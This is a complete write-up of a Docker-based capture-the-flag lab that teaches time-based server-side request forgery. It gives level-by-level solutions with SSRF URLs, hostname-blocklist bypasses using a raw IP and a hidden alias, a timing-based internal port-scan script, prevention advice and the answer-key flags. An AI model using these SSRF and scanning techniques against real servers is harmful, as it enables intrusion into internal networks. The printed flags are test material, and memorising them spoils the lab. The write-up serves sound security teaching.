# Time-based SSRF Lab - Complete Writeup

## Table of Contents
1. [Introduction](#introduction)
2. [Lab Architecture](#lab-architecture)
3. [Lab Setup](#lab-setup)
4. [What is Time-based SSRF?](#what-is-time-based-ssrf)
5. [Challenge Levels](#challenge-levels)
6. [Solutions](#solutions)
7. [Timing Analysis Techniques](#timing-analysis-techniques)
8. [Prevention](#prevention)

---

## Introduction

This lab teaches **Time-based Server-Side Request Forgery** - a technique where you infer successful SSRF exploitation through **response timing differences**. The internal service adds deliberate delays, allowing you to detect successful requests.

**Lab URL:** `http://YOUR_IP:8043/`
**Flag Format:** `IDS{32_character_hexadecimal}`

**Key Concept:** Successful SSRF requests take longer because the internal API adds intentional delays. Compare response times to detect and confirm SSRF.

---

## Lab Architecture

```
+-------------------+       Docker Network (172.33.0.0/16)
|                   |       +---------------------------+
|  User (Browser)   |       |                           |
|       |           |       |  +---------------------+  |
|       v           |       |  | timed-ssrf-app      |  |
|  http://IP:8043 --+-------+->| 172.33.0.10:80      |  |
|                   |       |  | (Vulnerable App +   |  |
|                   |       |  |  Timing Analysis)   |  |
|                   |       |  +----------+----------+  |
|                   |       |             |              |
|                   |       |    SSRF + timing measure   |
|                   |       |             |              |
|                   |       |  +----------v----------+  |
|                   |       |  | timed-internal-api  |  |
|                   |       |  | 172.33.0.50:80      |  |
|                   |       |  | NO EXTERNAL PORT    |  |
|                   |       |  | (Flags + Delays)    |  |
|                   |       |  | Also: secret-api    |  |
|                   |       |  +---------------------+  |
|                   |       +---------------------------+
```

**Key components:**
- `timed-ssrf-app` (port 8043): Vulnerable SSRF app with timing measurement
- `timed-internal-api` (no external port): Internal service with flags and deliberate delays
- Docker network aliases: `timed-internal-api`, `secret-api`, IP `172.33.0.50`
- Uses **cURL with HTTP/HTTPS only** (blocks file:// protocol)

### Timing Delays

| Level | Internal Delay | Detection Threshold |
|-------|---------------|---------------------|
| 1     | 3 seconds     | > 2500ms            |
| 2     | 5 seconds     | > 4500ms            |
| 3     | 7 seconds     | > 6500ms            |

---

## Lab Setup

```bash
cd /home/devuser/documents/tools/timed-ssrf-lab/
sudo docker-compose up -d --build
```

Access at `http://localhost:8043/`

---

## What is Time-based SSRF?

Time-based SSRF is used when:
- You cannot see the response (blind scenarios)
- No OOB/interceptor services are available
- Network isolation prevents external callbacks

**How it works:**
1. Send SSRF request to a URL
2. Measure response time
3. If time > threshold, the internal service was reached
4. The delay is caused by the internal service processing

| Method | Regular SSRF | Blind SSRF | Time-based SSRF |
|--------|-------------|------------|-----------------|
| Response visible | Yes | No | No |
| Interceptor needed | No | Yes | No |
| Detection | Direct | OOB callback | Timing difference |
| Tools | Browser | Collaborator | Timer/cURL |

---

## Challenge Levels

### Level 1: Basic Time-based SSRF (Medium)
**Objective:** Detect the internal service through timing and confirm SSRF.

**No filtering.** Internal API at `timed-internal-api` adds a 3-second delay on `/flag1`.

When the response time exceeds 2500ms, the flag is revealed.

**Flag:** `IDS{b464425c388728a6cffa52e56bb61794}`

---

### Level 2: Filtered Time-based SSRF (Hard)
**Objective:** Bypass hostname blocking and use timing to confirm success.

**Blocked:** `timed-internal-api` (hostname only)

Use the IP `172.33.0.50`. Internal API adds 5-second delay on `/flag2`.

**Flag:** `IDS{b9732f11fbf5299e6020d090355e4d98}`

---

### Level 3: Advanced Time-based SSRF (Hard)
**Objective:** Bypass both hostname and IP blocking. Discover an unknown hostname alias.

**Blocked:** `timed-internal-api`, `172.33.0.50`

The internal API has another hostname alias: `secret-api`. Internal API adds 7-second delay on `/flag3`.

**Flag:** `IDS{ee6830228e22877ee6f97aaa73cdd44f}`

---

## Solutions

### Level 1 Solution: Basic Timing Detection

Enter the internal API URL:
```
URL: http://timed-internal-api/flag1
```

**Test with cURL:**
```bash
time curl "http://localhost:8043/?level=1&url=http://timed-internal-api/flag1"
```

**Expected timing:**
```
real    0m3.012s    # ~3 seconds = SSRF successful!
```

When the page detects response time > 2500ms, it reveals:
```
IDS{b464425c388728a6cffa52e56bb61794}
```

**What you learned:** Internal services that take time to respond create detectable timing patterns through SSRF.

---

### Level 2 Solution: IP Bypass with Timing

The hostname `timed-internal-api` is blocked. Use the IP:

```
URL: http://172.33.0.50/flag2
```

**Test:**
```bash
time curl "http://localhost:8043/?level=2&url=http://172.33.0.50/flag2"
```

**Expected timing:** ~5 seconds (delay + processing)

**Flag:** `IDS{b9732f11fbf5299e6020d090355e4d98}`

---

### Level 3 Solution: Alias Discovery

Both hostname and IP are blocked. The service has an undiscovered alias `secret-api`:

```
URL: http://secret-api/flag3
```

**Test:**
```bash
time curl "http://localhost:8043/?level=3&url=http://secret-api/flag3"
```

**Expected timing:** ~7 seconds

**Flag:** `IDS{ee6830228e22877ee6f97aaa73cdd44f}`

**What you learned:** Blacklists are never complete. Services can have unknown aliases, VIPs, or secondary hostnames.

---

## Timing Analysis Techniques

### Using cURL with time
```bash
time curl "http://localhost:8043/?level=1&url=http://target/"
```

### Using cURL format output
```bash
curl -w "\nTotal: %{time_total}s\n" -o /dev/null -s \
  "http://localhost:8043/?level=1&url=http://target/"
```

### Using Python for precise timing
```python
import requests, time

start = time.time()
requests.get("http://localhost:8043/", params={"level": 1, "url": "http://timed-internal-api/flag1"})
elapsed = time.time() - start

if elapsed > 2.5:
    print(f"SSRF detected! ({elapsed:.2f}s)")
else:
    print(f"Blocked or failed ({elapsed:.2f}s)")
```

### Baseline vs Target Comparison
```bash
# Establish baseline (blocked request)
time curl "http://localhost:8043/?level=1&url=http://invalid/"     # ~0.1s

# Test target
time curl "http://localhost:8043/?level=1&url=http://timed-internal-api/flag1"  # ~3s
```

### Port Scanning via Timing
```python
import requests, time

for port in [22, 80, 443, 3306, 6379, 9200]:
    start = time.time()
    requests.get("http://localhost:8043/", params={"url": f"http://172.33.0.50:{port}/"}, timeout=15)
    elapsed = time.time() - start
    status = "OPEN" if elapsed > 2 else "CLOSED/FILTERED"
    print(f"Port {port}: {elapsed:.2f}s - {status}")
```

---

## Prevention

1. **Use consistent timing** - Don't let success/failure have different response times
2. **Whitelist allowed destinations** (not blacklist)
3. **Add random jitter** to all responses (not just successful ones)
4. **Disable redirect following** in HTTP clients
5. **Block outbound traffic** to internal networks
6. **Monitor for timing anomalies** in server logs
